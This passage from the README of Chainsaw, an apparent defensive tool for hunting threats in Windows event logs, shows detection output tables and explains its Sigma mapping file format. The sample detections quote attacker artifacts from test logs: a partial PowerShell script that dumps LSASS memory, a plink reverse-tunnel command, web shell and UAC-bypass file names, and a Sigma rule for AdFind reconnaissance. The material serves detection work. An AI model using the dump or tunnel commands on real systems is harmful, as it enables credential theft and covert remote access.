    │ 2021-04-20 20:33:13 │ 1  │ ‣ Suspicious Svchost Process             │ "MSEDGEWIN10"                  │ C:\Windows\System32\svchost.exe                    │ C:\Windows\system32\svchost.exe -k netsvcs -p -s g │
    │                     │    │ ‣ Windows Processes Suspicious           │                                │                                                    │ psvc                                               │
    │                     │    │ Parent Directory                         │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2021-04-20 20:33:14 │ 1  │ ‣ Suspicious Svchost Process             │ "MSEDGEWIN10"                  │ C:\Windows\System32\svchost.exe                    │ C:\Windows\system32\svchost.exe -k LocalService -p │
    │                     │    │ ‣ Windows Processes Suspicious           │                                │                                                    │  -s fdPHost                                        │
    │                     │    │ Parent Directory                         │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2021-04-22 22:09:26 │ 1  │ ‣ Windows Processes Suspicious           │ "MSEDGEWIN10"                  │ C:\Windows\System32\services.exe                   │ C:\Windows\system32\services.exe 652 "lsass.dmp" a │
    │                     │    │ Parent Directory                         │                                │                                                    │ 708b1d9-e27b-48bc-8ea7-c56d3a23f99 -v              │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2021-04-22 22:09:35 │ 1  │ ‣ Suspicious Svchost Process             │ "MSEDGEWIN10"                  │ C:\Windows\System32\svchost.exe                    │ C:\Windows\system32\svchost.exe -k LocalService -p │
    │                     │    │ ‣ Windows Processes Suspicious           │                                │                                                    │  -s fdPHost                                        │
    │                     │    │ Parent Directory                         │                                │                                                    │                                                    │
    └─────────────────────┴────┴──────────────────────────────────────────┴────────────────────────────────┴────────────────────────────────────────────────────┴────────────────────────────────────────────────────┘

    [+] Detection: Suspicious File Creation
    ┌─────────────────────┬────┬────────────────────────────────┬────────────────────────────┬────────────────────────────────────────────────────┬────────────────────────────────────────────────────┐
    │     system_time     │ id │        detection_rules         │       computer_name        │           Event.EventData.TargetFilename           │                       image                        │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-05-14 14:04:05 │ 11 │ ‣ Hijack Legit RDP Session     │ "alice.insecurebank.local" │ C:\Users\administrator\AppData\Roaming\Microsoft\W │ C:\Windows\system32\mstsc.exe                      │
    │                     │    │ to Move Laterally              │                            │ indows\Start Menu\Programs\Startup\cmd.exe         │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-19 14:45:31 │ 11 │ ‣ Startup Folder File Write    │ "MSEDGEWIN10"              │ C:\ProgramData\Microsoft\Windows\Start Menu\Progra │ C:\Windows\System32\WindowsPowerShell\v1.0\powersh │
    │                     │    │                                │                            │ ms\StartUp\Notepad.lnk                             │ ell.exe                                            │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-02-10 08:28:12 │ 11 │ ‣ Execution from Suspicious    │ "MSEDGEWIN10"              │ C:\Windows\System32\drivers\VBoxDrv.sys            │ c:\Users\Public\BYOV\TDL\Furutaka.exe              │
    │                     │    │ Folder                         │                            │                                                    │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-07-03 08:47:21 │ 11 │ ‣ Suspicious Desktopimgdownldr │ "MSEDGEWIN10"              │ C:\Users\IEUser\AppData\Local\Temp\Personalization │ C:\Windows\System32\svchost.exe                    │
    │                     │    │ Target File                    │                            │ \LockScreenImage\LockScreenImage_uXQ8IiHL80mkJsKc3 │                                                    │
    │                     │    │                                │                            │ 19JaA.7z                                           │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-17 11:43:33 │ 11 │ ‣ Execution from Suspicious    │ "MSEDGEWIN10"              │ C:\Users\IEUser\AppData\Roaming\WINWORD.exe        │ C:\Users\Public\tools\apt\wwlib\test.exe           │
    │                     │    │ Folder                         │                            │                                                    │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-17 11:43:33 │ 11 │ ‣ Execution from Suspicious    │ "MSEDGEWIN10"              │ C:\Users\IEUser\AppData\Roaming\wwlib.dll          │ C:\Users\Public\tools\apt\wwlib\test.exe           │
    │                     │    │ Folder                         │                            │                                                    │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-23 21:57:34 │ 11 │ ‣ Execution from Suspicious    │ "MSEDGEWIN10"              │ C:\Users\IEUser\AppData\Local\Temp\tmp1375\__tmp_r │ c:\Users\Public\test.tmp                           │
    │                     │    │ Folder                         │                            │ ar_sfx_access_check_2914968                        │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-23 21:57:34 │ 11 │ ‣ Execution from Suspicious    │ "MSEDGEWIN10"              │ C:\Users\IEUser\AppData\Local\Temp\tmp1375\d948    │ c:\Users\Public\test.tmp                           │
    │                     │    │ Folder                         │                            │                                                    │                                                    │
    ├─────────────────────┼────┼────────────────────────────────┼────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-11-26 17:38:11 │ 11 │ ‣ Execution from Suspicious    │ "LAPTOP-JU4M3I0E"          │ C:\Users\Public\tools\privesc\uac\system32\npmprox │ C:\Users\Public\tools\privesc\uac\byeintegrity5-ua │
    │                     │    │ Folder                         │                            │ y.dll                                              │ c.exe                                              │
    └─────────────────────┴────┴────────────────────────────────┴────────────────────────────┴────────────────────────────────────────────────────┴────────────────────────────────────────────────────┘


    [+] Detection: Windows Defender Detections
    ┌─────────────────────┬──────┬───────────────┬───────────────────────────────────┬────────────────────────────────────────────────────┬───────────────────────┐
    │     system_time     │  id  │   computer    │            threat_name            │                    threat_file                     │         user          │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────────────┼────────────────────────────────────────────────────┼───────────────────────┤
    │ 2019-07-18 20:40:00 │ 1116 │ "MSEDGEWIN10" │ "Trojan:PowerShell/Powersploit.M" │ "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\ │ "MSEDGEWIN10\\IEUser" │
    │                     │      │               │                                   │ atomics\\T1056\\Get-Keystrokes.ps1"                │                       │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────────────┼────────────────────────────────────────────────────┼───────────────────────┤
    │ 2019-07-18 20:40:16 │ 1116 │ "MSEDGEWIN10" │ "Trojan:XML/Exeselrun.gen!A"      │ "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\ │ "MSEDGEWIN10\\IEUser" │
    │                     │      │               │                                   │ atomics\\T1086\\payloads\\test.xsl"                │                       │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────────────┼────────────────────────────────────────────────────┼───────────────────────┤
    │ 2019-07-18 20:41:16 │ 1116 │ "MSEDGEWIN10" │ "HackTool:JS/Jsprat"              │ "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\ │ "MSEDGEWIN10\\IEUser" │
    │                     │      │               │                                   │ atomics\\T1100\\shells\\b.jsp->(SCRIPT0005)"       │                       │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────────────┼────────────────────────────────────────────────────┼───────────────────────┤
    │ 2019-07-18 20:41:17 │ 1116 │ "MSEDGEWIN10" │ "Backdoor:ASP/Ace.T"              │ "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\ │ "MSEDGEWIN10\\IEUser" │
    │                     │      │               │                                   │ atomics\\T1100\\shells\\cmd.aspx"                  │                       │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────────────┼────────────────────────────────────────────────────┼───────────────────────┤
    │ 2019-07-18 20:41:48 │ 1116 │ "MSEDGEWIN10" │ "Trojan:Win32/Sehyioa.A!cl"       │ "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\ │ "MSEDGEWIN10\\IEUser" │
    │                     │      │               │                                   │ atomics\\T1218\\src\\Win32\\T1218-2.dll"           │                       │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────────────┼────────────────────────────────────────────────────┼───────────────────────┤
    │ 2019-07-18 20:51:50 │ 1116 │ "MSEDGEWIN10" │ "HackTool:JS/Jsprat"              │ "containerfile:_C:\\AtomicRedTeam\\atomic-red-team │ "MSEDGEWIN10\\IEUser" │
    │                     │      │               │                                   │ -master\\atomics\\T1100\\shells\\b.jsp; file:_C:\\ │                       │
    │                     │      │               │                                   │ AtomicRedTeam\\atomic-red-team-master\\atomics\\T1 │                       │
    │                     │      │               │                                   │ 100\\shells\\b.jsp->(SCRIPT0005); file:_C:\\Atomic │                       │
    │                     │      │               │                                   │ RedTeam\\atomic-red-team-master\\atomics\\T1100\\s │                       │
    │                     │      │               │                                   │ hells\\b.jsp->(SCRIPT0037); file:_C:\\AtomicRedTea │                       │
    │                     │      │               │                                   │ m\\atomic-red-team-master\\atomics\\T1100\\shells\ │                       │
    │                     │      │               │                                   │ \b.jsp->(SCRIPT0045); file:_C:\\AtomicRedTeam\\ato │                       │
    │                     │      │               │                                   │ mic-red-team-master\\atomics\\T1100\\shells\\b.jsp │                       │
    │                     │      │               │                                   │ ->(SCRIPT0065); file:_C:\\AtomicRedTeam\\atomic-re │                       │
    │                     │      │               │                                   │ d-team-master\\atomics\\T1100\\shells\\b.jsp->(SCR │                       │
    │                     │      │               │                                   │ IPT0068)"                                          │                       │
    └─────────────────────┴──────┴───────────────┴───────────────────────────────────┴────────────────────────────────────────────────────┴───────────────────────┘

    [+] Detection: Suspicious Image Load
    ┌─────────────────────┬────┬─────────────────────────────┬───────────────┬────────────────────────────────────────────────────┬────────────────────────────────────────────────────┐
    │     system_time     │ id │       detection_rules       │ computer_name │               Event.EventData.Image                │                    image_loaded                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-27 18:47:00 │ 7  │ ‣ Execution from Suspicious │ "IEWIN7"      │ C:\Users\Public\KeeFarce.exe                       │ C:\Users\Public\BootstrapDLL.dll                   │
    │                     │    │ Folder                      │               │                                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-05-18 17:16:18 │ 7  │ ‣ In-memory PowerShell      │ "IEWIN7"      │ C:\Windows\System32\notepad.exe                    │ C:\Windows\assembly\NativeImages_v2.0.50727_32\Sys │
    │                     │    │                             │               │                                                    │ tem.Management.A#\4b93b6bd71723bed2fa9dd778436dd5e │
    │                     │    │                             │               │                                                    │ \System.Management.Automation.ni.dll               │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-05-23 17:26:08 │ 7  │ ‣ XSL Script Processing     │ "IEWIN7"      │ \\vboxsrv\HTools\msxsl.exe                         │ C:\Windows\System32\msxml3.dll                     │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-06-14 22:22:31 │ 7  │ ‣ WMI Modules Loaded        │ "IEWIN7"      │ C:\Users\IEUser\Downloads\a.exe                    │ C:\Windows\System32\wbem\wmiutils.dll              │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-06-14 22:23:26 │ 7  │ ‣ WMI Modules Loaded        │ "IEWIN7"      │ C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\B │ C:\Windows\System32\wbem\wmiutils.dll              │
    │                     │    │                             │               │ RE6BgE2JubB.exe                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-08-30 12:54:08 │ 7  │ ‣ WMI Modules Loaded        │ "MSEDGEWIN10" │ C:\Windows\System32\cscript.exe                    │ C:\Windows\System32\wbem\wmiutils.dll              │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-08-02 16:24:07 │ 7  │ ‣ Fax Service DLL Search    │ "MSEDGEWIN10" │ C:\Windows\System32\FXSSVC.exe                     │ C:\Windows\System32\Ualapi.dll                     │
    │                     │    │ Order Hijack                │               │                                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-15 13:17:02 │ 7  │ ‣ Execution from Suspicious │ "MSEDGEWIN10" │ C:\Users\Public\tools\apt\tendyron.exe             │ C:\Users\Public\tools\apt\OnKeyToken_KEB.dll       │
    │                     │    │ Folder                      │               │                                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-17 11:43:28 │ 7  │ ‣ Execution from Suspicious │ "MSEDGEWIN10" │ C:\Users\Public\tools\apt\wwlib\test.exe           │ C:\Users\Public\tools\apt\wwlib\wwlib.dll          │
    │                     │    │ Folder                      │               │                                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-17 11:43:28 │ 7  │ ‣ Execution from Suspicious │ "MSEDGEWIN10" │ C:\Users\Public\tools\apt\wwlib\test.exe           │ C:\Users\Public\tools\apt\wwlib\wwlib.dll          │
    │                     │    │ Folder                      │               │                                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-17 11:43:31 │ 7  │ ‣ Execution from Suspicious │ "MSEDGEWIN10" │ C:\Users\Public\tools\apt\wwlib\test.exe           │ C:\Users\Public\tools\apt\wwlib\wwlib.dll          │
    │                     │    │ Folder                      │               │                                                    │                                                    │
    ├─────────────────────┼────┼─────────────────────────────┼───────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-10-17 11:43:31 │ 7  │ ‣ Execution from Suspicious │ "MSEDGEWIN10" │ C:\Users\Public\tools\apt\wwlib\test.exe           │ C:\Users\Public\tools\apt\wwlib\wwlib.dll          │
    │                     │    │ Folder                      │               │                                                    │                                                    │
    └─────────────────────┴────┴─────────────────────────────┴───────────────┴────────────────────────────────────────────────────┴────────────────────────────────────────────────────┘

    [+] Detection: Suspicious Powershell ScriptBlock
    ┌─────────────────────┬──────┬──────────────────────────┬───────────────┬────────────────────────────────────────────────────┐
    │     system_time     │  id  │     detection_rules      │ computer_name │          Event.EventData.ScriptBlockText           │
    ├─────────────────────┼──────┼──────────────────────────┼───────────────┼────────────────────────────────────────────────────┤
    │ 2020-06-30 14:24:08 │ 4104 │ ‣ PowerShell Get-Process │ "MSEDGEWIN10" │ function Memory($path){  $Process = Get-Process ls │
    │                     │      │ LSASS in ScriptBlock     │               │ ass$DumpFilePath = $path$WER = [PSObject].Assembly │
    │                     │      │                          │               │ .GetType('System.Management.Automation.WindowsErro │
    │                     │      │                          │               │ rReporting')$WERNativeMethods = $WER.GetNestedType │
    │                     │      │                          │               │ ('NativeMethods', 'NonPublic')$Flags = [Reflection │
    │                     │      │                          │               │ .BindingFlags] 'NonPublic, Static'$MiniDumpWriteDu │
    │                     │      │                          │               │ mp = $WERNativeMethods.GetMethod('MiniDumpWriteDum │
    │                     │      │                          │               │ p', $Flags)$MiniDumpWithFullMemory = [UInt32] 2 #$ │
    │                     │      │                          │               │ ProcessId = $Process.Id$ProcessName = $Process.Nam │
    │                     │      │                          │               │ e$ProcessHandle = $Process.Handle$ProcessFileName  │
    │                     │      │                          │               │ = "$($ProcessName).dmp"$ProcessDumpPath = Join-Pat │
    │                     │      │                          │               │ h $DumpFilePath $ProcessFileName$FileStream = New- │
    │                     │      │                          │               │ Object IO.FileStream($ProcessDumpPath, [IO.FileMod │
    │                     │      │                          │               │ e]::Create) $Result = $MiniDumpWriteDump.Invoke($n │
    │                     │      │                          │               │ ull, @($ProcessHandle,$ProcessId,$FileStream.SafeF │
    │                     │      │                          │               │ ileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[ │
    │                     │      │                          │               │ IntPtr]::Zero,[IntPtr]::Zero)) $FileStream.Close() │
    │                     │      │                          │               │ if (-not $Result){$Exception = New-Object Componen │
    │                     │      │                          │               │ tModel.Win32Exception$ExceptionMessage = "$($Excep │
    │                     │      │                          │               │ tion.Message) ($($ProcessName):...                 │
    │                     │      │                          │               │                                                    │
    │                     │      │                          │               │ (use --full to show all content)                   │
    └─────────────────────┴──────┴──────────────────────────┴───────────────┴────────────────────────────────────────────────────┘

    [+] Detection: System log was cleared
    ┌─────────────────────┬─────┬───────────────────────────────────┬──────────────┐
    │     system_time     │ id  │             computer              │ subject_user │
    ├─────────────────────┼─────┼───────────────────────────────────┼──────────────┤
    │ 2019-03-19 23:34:25 │ 104 │ "PC01.example.corp"               │ "user01"     │
    ├─────────────────────┼─────┼───────────────────────────────────┼──────────────┤
    │ 2020-09-15 19:28:31 │ 104 │ "01566s-win16-ir.threebeesco.com" │ "a-jbrown"   │
    └─────────────────────┴─────┴───────────────────────────────────┴──────────────┘

    [+] Detection: New User Created
    ┌─────────────────────┬──────┬───────────────────────────────────┬─────────────────┬──────────────────────────────────────────────────┐
    │     system_time     │  id  │             computer              │ target_username │                     user_sid                     │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┼──────────────────────────────────────────────────┤
    │ 2020-09-16 09:31:19 │ 4720 │ "01566s-win16-ir.threebeesco.com" │ "$"             │ "S-1-5-21-308926384-506822093-3341789130-107103" │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┼──────────────────────────────────────────────────┤
    │ 2020-09-16 09:32:13 │ 4720 │ "01566s-win16-ir.threebeesco.com" │ "$"             │ "S-1-5-21-308926384-506822093-3341789130-107104" │
    └─────────────────────┴──────┴───────────────────────────────────┴─────────────────┴──────────────────────────────────────────────────┘

    [+] Detection: User added to interesting group
    ┌─────────────────────┬──────┬───────────────┬───────────────────────────┬─────────────────────────────────────────────────┬──────────────────┐
    │     system_time     │  id  │   computer    │        change_type        │                    user_sid                     │   target_group   │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────┼─────────────────────────────────────────────────┼──────────────────┤
    │ 2019-09-22 11:22:05 │ 4732 │ "MSEDGEWIN10" │ User added to local group │ "S-1-5-21-3461203602-4096304019-2269080069-501" │ "Administrators" │
    ├─────────────────────┼──────┼───────────────┼───────────────────────────┼─────────────────────────────────────────────────┼──────────────────┤
    │ 2019-09-22 11:23:19 │ 4732 │ "MSEDGEWIN10" │ User added to local group │ "S-1-5-20"                                      │ "Administrators" │
    └─────────────────────┴──────┴───────────────┴───────────────────────────┴─────────────────────────────────────────────────┴──────────────────┘


## How to add support for more rules
The following sections will guide you through how to work with Chainsaw's mapping files in order to add support for additional Sigma rules that may be unsupported by Chainsaw's default configuration.

### What is the mapping file?
In order to support Sigma rule detection logic, Chainsaw requires a 'mapping file' to specify:

 - Which event IDs to process
 - Which fields in the event logs are important
 - Which fields to include when displaying the output of Chainsaw

The included sigma mapping in the "mapping_files" directory already supports most of the key Event IDs, but if you want to add support for additional event IDs or use additional event log fields in a Sigma rule then you'll need to augment the mapping file.

Let's take a look at the default mapping file that ships with Chainsaw. The mapping file is written in Yaml and contains three top level keys:

 - kind
 - exclusions
 - mappings

#### Kind

	# Supported values are Stalker and Sigma
	kind: sigma

The 'kind' key tells Chainsaw whether the specified rules are in a Sigma rule format, or in a Stalker rule format. For the vast majority of Chainsaw users you're going to be using the Sigma rule format. Stalker rules are a custom rule format that are used at F-Secure and are not publicly available.

*Tl;Dr - Unless you know what you're doing, leave this key set to 'sigma'*

#### Exclusions

	exclusions:
	  - "Wuauclt Network Connection"
	  - "Exports Registry Key To an Alternate Data Stream"
	  - "NetNTLM Downgrade Attack"
	  - "Non Interactive PowerShell"

The exclusions key tells Chainsaw to ignore certain rules by their name. For example, in testing we found that the 'Non Interactive PowerShell' Sigma rule is very noisy and resulted in significant bloat to the output of Chainsaw. The default mapping files specifies this rule name in the 'exclusions' key to skip this rule if it's provided.

Tl;Dr - *You can use the exclusions sections of the mapping file to skip certain rules by name*

#### Mappings

	mappings:
	  1: <----- Event ID
	    title: "Suspicious Process Creation"
	    provider: "Microsoft-Windows-Sysmon" <----- Event Provider
	    search_fields: <---- Map Sigma fields to Event Log Fields
	      Image: "Event.EventData.Image"
	      CommandLine: "Event.EventData.CommandLine"
	      ParentImage: "Event.EventData.ParentImage"
	      ParentCommandLine: "Event.EventData.ParentCommandLine"
	      OriginalFileName: "Event.EventData.OriginalFileName"
	    table_headers: <------- Which fields to output in table/csv/json
	      context_field: "Event.EventData.Image"
	      command_line: "Event.EventData.CommandLine"

The mappings key is the core part of the mappings file. This section tells Chainsaw:

 - What event IDs to process (e.g. Event ID 4104)
 - What event ID provider to process  (e.g. Microsoft-Windows-Sysmon)
 - What fields in those event logs to care process (e.g. Event.EventData.OriginalFileName)
 - What fields to display in the table output when a rule matches

Let's take a look at each of the sub-keys in turn:

##### Event ID

If we look at the example mapping file shown a few lines above, this snippet is telling Chainsaw to process all of the Windows Event Logs that have the ID of '1'.  **When Chainsaw parses event logs in 'hunt' mode, if the event ID is not listed in the mapping file, it will be ignored.** This approach helps to drastically speed up the execution time of Chainsaw, because it means that we only perform rule matching on the event logs that we definitely care about.

##### Provider

Only specifying the event ID is not granular enough; random Windows applications can specify their own event ID so if we want to target just the process creation event logs for sysmon (which is what we're looking for with Event ID 1) then we need to be more specific about which event logs we're interested in. This is why we also need to specify the provider as well:

	provider: "Microsoft-Windows-Sysmon"

So in this case, Chainsaw will only process Windows event log entries if the event ID is "1" AND the provider is "Microsoft-Windows-Sysmon".

##### Title

The *title* key specifies what text Chainsaw should put at the top of each section of output relating to detections for these event IDs. So in this example, all detections relating to EventID: 1 from the Sysmon provider will be titled "Suspicious Process Creation":

	[+] Detection: Suspicious Process Creation
	    ┌─────────────────────┬────┬──────────────────────────────────────────┬────────────────────────────────┬────────────────────────────────────────────────────┬────────────────────────────────────────────────────┐
	    │     system_time     │ id │             detection_rules              │         computer_name          │               Event.EventData.Image                │                    command_line                    │
	    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
	    │ 2019-02-16 10:02:21 │ 1  │ ‣ Exfiltration and Tunneling             │ "PC01.example.corp"            │ C:\Users\IEUser\Desktop\plink.exe                  │ plink.exe 10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127 │
	    │                     │    │ Tools Execution                          │                                │                                                    │ .0.0.2:3389 -l test -pw test                       │

##### search_fields

The search fields sub-key tells chainsaw which fields in the event log to process, and how they should be mapped to the Sigma rule format. Let's look at an example, let's say we want to run the following Sigma rule over all Process Creation events from Sysmon:

	title: Suspicious AdFind Execution
	id: 75df3b17-8bcc-4565-b89b-c9898acef911
	status: experimental
	description: Detects the execution of a AdFind for Active Directory enumeration
	references:
	    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
	    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md
	    - https://thedfirreport.com/2020/05/08/adfind-recon/
	author: FPT.EagleEye Team, omkar72, oscd.community
	date: 2020/09/26
	modified: 2021/05/12
	tags:
	    - attack.discovery
	    - attack.t1018
	    - attack.t1087.002
	    - attack.t1482
	    - attack.t1069.002
	logsource:
	    product: windows
	    category: process_creation
	detection:
	    selection:
	        CommandLine|contains:
	            - 'objectcategory'
	            - 'trustdmp'
	            - 'dcmodes'
	            - 'dclist'
	            - 'computers_pwdnotreqd'
	        Image|endswith: '\adfind.exe'
	    condition: selection
	falsepositives:
	    - Administrative activity
	level: medium

In the Sigma rule above, we can see that the detection criteria relies on two key fields:

 - CommandLine
 - Image

Without a mapping file, Chainsaw wouldn't know which fields in the event log (they're not always named the same) to apply this logic to. So we need to tell Chainsaw which event log fields are the CommandLine and the Image. Fortunately Chainsaw gives us a way to find out this information, let's look at an example event ID 1 log:

	> % ./chainsaw search -e 1 ~/chainsaw/evtx_attack_samples/ -q | head -n 50
	---
	Event:
	  EventData:
	    CommandLine: "plink.exe  10.0.2.18 -P 80 -C -R  127.0.0.3:4444:127.0.0.2:3389 -l test -pw test" <------ Command Line
	    Company: Simon Tatham
	    CurrentDirectory: "C:\\Users\\IEUser\\Desktop\\"
	    Description: "Command-line SSH, Telnet, and Rlogin client"
	    FileVersion: Release 0.70
	    Hashes: SHA1=7806AD24F669CD8BB9EBE16F87E90173047F8EE4
	    Image: "C:\\Users\\IEUser\\Desktop\\plink.exe" <----- Process Name
	    IntegrityLevel: High
	    LogonGuid: 365ABB72-D6AB-5C67-0000-002056660200
	    LogonId: "0x26656"
	    ParentCommandLine: "\"C:\\Windows\\system32\\cmd.exe\" "
	    ParentImage: "C:\\Windows\\System32\\cmd.exe"
	    ParentProcessGuid: 365ABB72-D92A-5C67-0000-0010CB580900
	    ParentProcessId: 3904
	    ProcessGuid: 365ABB72-DFAD-5C67-0000-0010E0811500
	    ProcessId: 2312
	    Product: PuTTY suite
	    RuleName: ""
	    TerminalSessionId: 1
	    User: "PC01\\IEUser"
	    UtcTime: "2019-02-16 10:02:21.934"
	  System:
	    Channel: Microsoft-Windows-Sysmon/Operational
	    Computer: PC01.example.corp
	    Correlation: ~
	    EventID: 1
	    EventRecordID: 1940899
	    Execution_attributes:
	      ProcessID: 1728
	      ThreadID: 412
	    Keywords: "0x8000000000000000"
	    Level: 4
	    Opcode: 0
	    Provider_attributes:
	      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
	      Name: Microsoft-Windows-Sysmon <----- Provider
	    Security_attributes:
	      UserID: S-1-5-18
	    Task: 1
	    TimeCreated_attributes:
	      SystemTime: "2019-02-16T10:02:21.934438Z"
	    Version: 5
	Event_attributes:
	  xmlns: "http://schemas.microsoft.com/win/2004/08/events/event"

Looking at the output of Chainsaw above, we can see that the fields that we need to map are:

 - CommandLine == Event.EventData.CommandLine
 - Image == Event.EventData.Image

By adding this information to the mapping file, Chainsaw can now run this sigma rule against the process creation event logs.

##### table_headers

The table_headers key in the mapping file tells Chainsaw which fields to output when displaying detections. Displaying all the fields in the event log would be difficult to format and would be difficult for analysts to view, so instead we specify the key fields that we care about.

This section **must** contain at least one sub-key named: *context_field*. The field specified in this key will always be placed in the left most position on the table output. All other specified fields will be placed after that. Let's take a look at an example:

	    table_headers: <------- Which fields to output in table/csv
	      context_field: "Event.EventData.Image"
	      command_line: "Event.EventData.CommandLine"

This means that for every detection for Event ID: 1 (sysmon process creation) events, the  **Event.EventData.Image** and **Event.EventData.CommandLine** fields from the matching event log will be shown in the output of Chainsaw:

	[+] Detection: Suspicious Process Creation
	    ┌─────────────────────┬────┬──────────────────────────────────────────┬────────────────────────────────┬────────────────────────────────────────────────────┬────────────────────────────────────────────────────┐
	    │     system_time     │ id │             detection_rules              │         computer_name          │               Event.EventData.Image                │                    command_line                    │
	    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
	    │ 2019-02-16 10:02:21 │ 1  │ ‣ Exfiltration and Tunneling             │ "PC01.example.corp"            │ C:\Users\IEUser\Desktop\plink.exe                  │ plink.exe 10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127 │
	    │                     │    │ Tools Execution                          │                                │                                                    │ .0.0.2:3389 -l test -pw test                       │

(Note: the system_time, event ID, detection_rule and computer name will always be shown in addition to the fields specified in the table_headers section)

### Acknowledgements
 - [EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES) by [SBousseaden](https://twitter.com/SBousseaden)
 - [Sigma](https://github.com/SigmaHQ/sigma) detection rules
 - [EVTX parser](https://github.com/omerbenamram/evtx) library by [@OBenamram](https://twitter.com/obenamram?lang=en)
 - [TAU Engine](https://github.com/countercept/tau-engine) Library by [@AlexKornitzer](https://twitter.com/AlexKornitzer?lang=en)
